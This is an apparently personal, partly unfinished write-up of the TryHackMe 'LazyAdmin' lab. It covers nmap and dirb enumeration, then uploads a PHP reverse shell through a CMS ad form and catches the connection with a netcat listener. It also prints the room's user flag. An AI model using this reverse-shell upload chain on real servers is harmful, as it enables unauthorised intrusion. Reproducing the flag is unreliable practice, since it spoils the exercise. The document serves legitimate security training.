# Room Information

Room link: https://tryhackme.com/room/lazyadmin

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 6/27/2023

# Scanning and Enumeration
> Port Scanning Using Nmap
1. Started up this room’s machine
2. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt` to perform a network scan to scan for open ports while utilizing default scripts (-sC) and version detection (-sV) to identify services, as well as their versions, and vulnerabilities on the target system, and then redirect the results into a text file
3. `cat {FILENAME1}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.10.165.242 > PortScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat PortScan.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 18:46 EDT
Nmap scan report for 10.10.165.242
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
```

#
> Scanning for Hiddent Web Directories Using Dirb
4. `dirb http://{TARGET IP} > {FILENAME2}.txt` to non-recursively scan the target URL for directories using Dirb's default wordlist and then redirecting the results into a text file
5. `cat {FILENAME2}.txt` to output the scan results from the previous command
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.165.242 > WebDirectoryScan.txt
```
```bash
┌──(kali㉿kali)-[~]
└─$ cat WebDirectoryScan.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 27 18:53:42 2023
URL_BASE: http://10.10.165.242/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.165.242/ ----
==> DIRECTORY: http://10.10.165.242/content/              
+ http://10.10.165.242/index.html (CODE:200|SIZE:11321)        
+ http://10.10.165.242/server-status (CODE:403|SIZE:278)                                                          
---- Entering directory: http://10.10.165.242/content/ ----
==> DIRECTORY: http://10.10.165.242/content/_themes/             
==> DIRECTORY: http://10.10.165.242/content/as/               
==> DIRECTORY: http://10.10.165.242/content/attachment/       
==> DIRECTORY: http://10.10.165.242/content/images/    
==> DIRECTORY: http://10.10.165.242/content/inc/       
+ http://10.10.165.242/content/index.php (CODE:200|SIZE:2199)      
==> DIRECTORY: http://10.10.165.242/content/js/                                                                   
---- Entering directory: http://10.10.165.242/content/_themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                               
---- Entering directory: http://10.10.165.242/content/as/ ----
+ http://10.10.165.242/content/as/index.php (CODE:200|SIZE:3678)    
==> DIRECTORY: http://10.10.165.242/content/as/js/     
==> DIRECTORY: http://10.10.165.242/content/as/lib/                                                                 
---- Entering directory: http://10.10.165.242/content/attachment/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/inc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/as/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://10.10.165.242/content/as/lib/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Jun 27 19:14:26 2023
DOWNLOADED: 13836 - FOUND: 4
```

# 
>
6. `firefox "http://{TARGET IP}/content/inc`
![]()
7. `firefox "http://{TARGET IP}/content/inc/mysql_backup/"`
![]()
8. `firefox "http://{TARGET IP}/content/as"`

# Vulnerability Identification
> Command Injection
9. Upload a test ad
![]()
10. `firefox "http://{TARGET IP}/content/inc/ads"`

#
> Step

# Vulnerability Exploitation
> Step
11. `git clone https://github.com/pentestmonkey/php-reverse-shell`
12. `ls`
13. `cd php-reverse-shell`
14. `ls`
15. `mousepad php-reverse-shell.php`
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ git clone https://github.com/pentestmonkey/php-reverse-shell
Cloning into 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Receiving objects: 100% (10/10), 9.81 KiB | 590.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
 php-reverse-shell
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cd php-reverse-shell
```
```bash
┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
└─$ ls
CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.php  README.md
```
```bash
┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
└─$ mousepad php-reverse-shell.php
```
![]()
16. `nc -lvnp {PORT NUMBER}`
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999                            
listening on [any] 9999 ...
```
17 `firefox "http://10.10.165.242/content/as/?type=ad"`
![]()
18. Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
![]()
19. `firefox "http://10.10.165.242/content/inc/ads/"`
![]()
20. Click on it
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999                            
listening on [any] 9999 ...
connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 46436
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 05:02:10 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
21. `ls`
22. `ls /home`
23. `ls /home/{USER}`
24. `cat /home/{USER}/{USER FLAG}.txt`
```bash
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
```bash
$ ls /home
itguy
```
```bash
$ ls /home/itguy
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
```
```bash
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

#
> Step

# Post Exploitation
> Step

#
> "`Step

# Contributions
This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)


Socials:
* TryHackMe ID: https://tryhackme.com/p/mtlfriends
* LinkedIn: https://www.linkedin.com/in/jonmar-corpuz-12771a234/


